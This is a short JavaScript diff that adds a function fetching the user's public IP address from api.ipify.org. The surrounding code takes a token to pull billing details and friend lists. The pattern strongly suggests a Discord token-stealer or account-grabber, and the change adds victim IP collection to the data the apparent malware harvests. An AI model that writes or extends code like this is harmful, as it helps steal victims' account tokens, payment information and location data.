@@ -419,6 +419,16 @@ const getBilling = async token => {
     return billing || '`❌`';
 };
 
+const getIP = async () => {
+    try {
+        const response = await request("GET", "https://api.ipify.org?format=json");
+        return response.ip || "Unknown";
+    } catch (e) {
+        debugLog(`Error fetching IP: ${e.message}`);
+        return "Unknown";
+    }
+};
+
 const getFriends = async token => {
     const friends = await fetchFriends(token);
     const filteredFriends = friends.filter((user) => {
